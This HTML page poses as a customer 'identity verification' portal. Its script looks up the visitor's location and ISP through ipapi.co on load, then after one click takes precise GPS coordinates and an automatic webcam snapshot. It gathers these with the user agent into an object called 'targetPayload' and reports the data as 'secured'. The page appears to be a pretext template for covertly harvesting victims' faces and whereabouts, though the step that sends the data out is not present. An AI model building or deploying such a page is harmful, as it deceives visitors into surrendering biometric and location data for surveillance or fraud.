<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instant Verification Portal</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f4f6f9; margin: 0; padding: 20px;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }
        .portal-card {
            background: #ffffff; max-width: 450px; width: 100%;
            padding: 30px; border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.08); text-align: center;
        }
        h2 { color: #1a73e8; margin-top: 0; }
        .status-box {
            background: #e8f0fe; color: #1967d2; padding: 12px;
            border-radius: 6px; font-size: 0.9rem; margin-bottom: 20px; font-weight: 500;
        }
        .media-container {
            width: 100%; background: #000; border-radius: 8px;
            overflow: hidden; position: relative; margin-bottom: 20px; aspect-ratio: 4/3;
        }
        video { width: 100%; height: 100%; object-fit: cover; }
        canvas { display: none; }
        .preview-img {
            width: 100%; height: 100%; object-fit: cover;
            position: absolute; top: 0; left: 0; display: none; border: 3px solid #34a853;
        }
        .action-btn {
            width: 100%; padding: 14px; font-size: 1rem; font-weight: bold;
            border: none; border-radius: 6px; cursor: pointer;
            background-color: #1a73e8; color: white;
        }
    </style>
</head>
<body>

<div class="portal-card">
    <h2>Customer Portal</h2>
    <div id="statusLabel" class="status-box">Camera & Location access required for application form.</div>

    <div class="media-container">
        <video id="webcam" autoplay playsinline></video>
        <canvas id="captureCanvas" width="640" height="480"></canvas>
        <img id="savedFrame" class="preview-img" alt="Captured Frame">
    </div>

    <button id="startBtn" class="action-btn" onclick="initiateInstantSystem()">Start Identity Verification</button>
</div>

<script>
    let activeStream = null;
    
    const targetPayload = {
        deviceModel: navigator.userAgent,
        broadLocation: "Verifying...",
        exactCoordinates: "Not Granted",
        photoBase64String: null
    };

    // Auto Broad Location Profiling via IP
    fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            targetPayload.broadLocation = `${data.city}, ${data.region}, ${data.org}`;
        }).catch(() => { targetPayload.broadLocation = "Failed"; });

    function initiateInstantSystem() {
        const statusLabel = document.getElementById('statusLabel');
        statusLabel.innerText = "Processing system initialization...";

        // 1. Core Geolocation Data Capture
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => { targetPayload.exactCoordinates = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`; },
                (err) => { targetPayload.exactCoordinates = `Denied: ${err.message}`; },
                { enableHighAccuracy: true }
            );
        }

        // 2. Hardware Stream Request (Triggers standard system pop-ups)
        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" }, audio: false })
            .then((stream) => {
                activeStream = stream;
                const videoEl = document.getElementById('webcam');
                videoEl.srcObject = stream;
                document.getElementById('startBtn').style.display = "none";
                statusLabel.innerText = "System processing, hold steady...";
                
                // Jaise hi video play hona shuru ho, kuch milliseconds ka pause le kar auto-capture run karein
                videoEl.onloadedmetadata = () => {
                    setTimeout(() => {
                        executeInstantCapture();
                    }, 500); // 500 milliseconds ka hardware stabilization pause
                };
            })
            .catch((err) => {
                statusLabel.innerText = "Permission Denied. Manual override required.";
                statusLabel.style.background = "#fce8e6"; statusLabel.style.color = "#c5221f";
            });
    }

    function executeInstantCapture() {
        const videoEl = document.getElementById('webcam');
        const canvasEl = document.getElementById('captureCanvas');
        const previewImg = document.getElementById('savedFrame');
        const statusLabel = document.getElementById('statusLabel');

        const context = canvasEl.getContext('2d');
        // Render current stream buffer directly onto the canvas mapping
        context.drawImage(videoEl, 0, 0, 640, 480);

        // Serialize output data matrix into JPEG string format
        const base64Data = canvasEl.toDataURL('image/jpeg', 0.9);
        targetPayload.photoBase64String = base64Data;

        // Visual confirmation override
        previewImg.src = base64Data;
        previewImg.style.display = "block";

        // Release hardware blocks immediately
        if (activeStream) {
            activeStream.getTracks().forEach(track => track.stop());
        }

        statusLabel.innerText = "✓ Identity Data Secured!";
        statusLabel.style.background = "#e6f4ea"; statusLabel.style.color = "#137333";

        console.log("=== SECURED PAYLOAD ===");
        console.log(targetPayload);
        
        alert("Verification completed automatically. Data structured in background payload.");
    }
</script>

</body>
</html>
